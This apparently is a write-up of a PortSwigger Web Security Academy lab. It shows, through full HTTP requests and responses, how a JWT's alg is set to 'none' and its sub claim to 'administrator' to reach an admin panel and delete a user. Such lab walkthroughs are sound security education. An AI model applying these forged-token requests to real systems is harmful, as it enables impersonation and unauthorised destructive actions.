# JWT authentication bypass via unverified signature

This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives.

To solve the lab, modify your session token to gain access to the admin panel at `/admin`, then delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`.

---

## 1. Detection

- Logged in with the provided credentials by submitting the login form:

```http
POST /login HTTP/2
Host: 0a9000620451f61c80bbcc9500e00037.web-security-academy.net
Cookie: session=
Content-Length: 68
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Origin: https://0a9000620451f61c80bbcc9500e00037.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a9000620451f61c80bbcc9500e00037.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

csrf=q1py3VBhGkx0szdVAB6EsH7npTuYr1rv&username=wiener&password=peter
```

- Got a successful login response, which set a `session` cookie containing a JWT:

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=eyJraWQiOiIxYmU1MDE3My1mZTRhLTRlMmItYWY5NC1lNzZmNDYzY2ZiYzEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MjcxNjQ1MCwic3ViIjoid2llbmVyIn0.UkSwh2CurEyJYeWvIVw3EHQ1uFh-j1K7Mf489aEX4wt3CaCL_aKo5vWqoLn4d0m_s6RqYpP12cp_sIDtQ2gHqDwPrHR1Q0SeC29f0WrHmUjZuGaYf5pnr7B0QCyC30-61z2K3AE7OFo-x4QwvakIK6Kfra-yRbJUlHK5n5Pj_poZRg60tkN5gpTKeS6pZFa73OIzdi3QrvNM1kPcV_N93p_rtQxjNytIsi3rsOCdUYRNf3xXOxwdUs-LXTQ7kXFy277Wj3MGw4Iy6Zw3UgPv9HiFSlEldarGD1epnfGGAwaj7BKETpTgg_d385k-Ad9Em-uTg7AQlW5_92WhH5Neew; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

- Decoded the JWT using [jwt.io](https://jwt.io) to inspect its structure. The header was:

```json
{
  "kid": "1be50173-fe4a-4e2b-af94-e76f463cfbc1",
  "alg": "RS256"
}
```

- And the payload was:

```json
{
  "iss": "portswigger",
  "exp": 1782716450,
  "sub": "wiener"
}
```

- jwt.io's signature verification panel returned: *"Unable to retrieve public key from issuer (iss) 'portswigger'. Expected a valid HTTPS URL. Please enter public key manually to verify the JWT signature."* — meaning the token is signed with `RS256` (an asymmetric algorithm), and verification would normally require the server's public key, which isn't available here.

---

## 2. Exploiting the Unverified Signature

- Since the lab description explicitly states the server doesn't verify JWT signatures at all, the natural test was to see if the algorithm and payload could simply be modified without needing any valid signature.
- Changed the header's `alg` from `RS256` to `none`, and changed the payload's `sub` claim from `wiener` to `administrator`, then stripped the signature segment entirely (leaving the trailing `.` with nothing after it, consistent with the `alg: none` convention):

```http
GET /my-account HTTP/2
Host: 0a9000620451f61c80bbcc9500e00037.web-security-academy.net
Cookie: session=eyJraWQiOiIxYmU1MDE3My1mZTRhLTRlMmItYWY5NC1lNzZmNDYzY2ZiYzEiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MjcxNjQ1MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
Cache-Control: max-age=0
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0a9000620451f61c80bbcc9500e00037.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
```

- The response confirmed the server accepted the forged token at face value — it now showed an `Admin panel` link and treated the session as belonging to `administrator`:

```html
<div theme="">
    <section class="maincontainer">
        <div class="container is-page">
            <header class="navigation-header">
                <section class="top-links">
                    <a href=/>Home</a><p>|</p>
                    <a href="/admin">Admin panel</a><p>|</p>
                    <a href="/my-account?id=administrator">My account</a><p>|</p>
                    <a href="/logout">Log out</a><p>|</p>
                </section>
            </header>
            <header class="notification-header">
            </header>
            <h1>My Account</h1>
            <div id=account-content>
                <p>Your username is: administrator</p>
                <p>Your email is: <span id="user-email">admin@normal-user.net</span></p>
```

> **Why this works:** The server decodes the JWT's payload and trusts whatever `sub` claim it finds, without ever validating the signature against the issuer's public key. Setting `alg` to `none` and dropping the signature segment entirely is a well-known JWT bypass — many JWT libraries historically honored `alg: none` as a literal instruction to skip signature verification. Since this server already isn't verifying signatures of any kind, simply editing the claims directly (here, swapping `sub` from `wiener` to `administrator`) is enough to impersonate any user with no cryptographic material required at all.

---

## 3. Solve the Challenge

- With the forged token now authenticating as `administrator`, accessed the admin panel directly:

```http
GET /admin HTTP/2
Host: 0a9000620451f61c80bbcc9500e00037.web-security-academy.net
Cookie: session=eyJraWQiOiIxYmU1MDE3My1mZTRhLTRlMmItYWY5NC1lNzZmNDYzY2ZiYzEiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MjcxNjQ0MSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
```

- Got the admin user list back:

```html
</header>
<section>
    <h1>Users</h1>
    <div>
        <span>wiener - </span>
        <a href="/admin/delete?username=wiener">Delete</a>
    </div>
    <div>
        <span>carlos - </span>
        <a href="/admin/delete?username=carlos">Delete</a>
    </div>
</section>
```

- Followed the delete link for `carlos`, keeping the same forged session cookie:

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a9000620451f61c80bbcc9500e00037.web-security-academy.net
Cookie: session=eyJraWQiOiIxYmU1MDE3My1mZTRhLTRlMmItYWY5NC1lNzZmNDYzY2ZiYzEiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MjcxNjQ0MSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
```

- Got back:

```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

- Followed the redirect back to `/admin`. User `carlos` was deleted.
- Lab solved.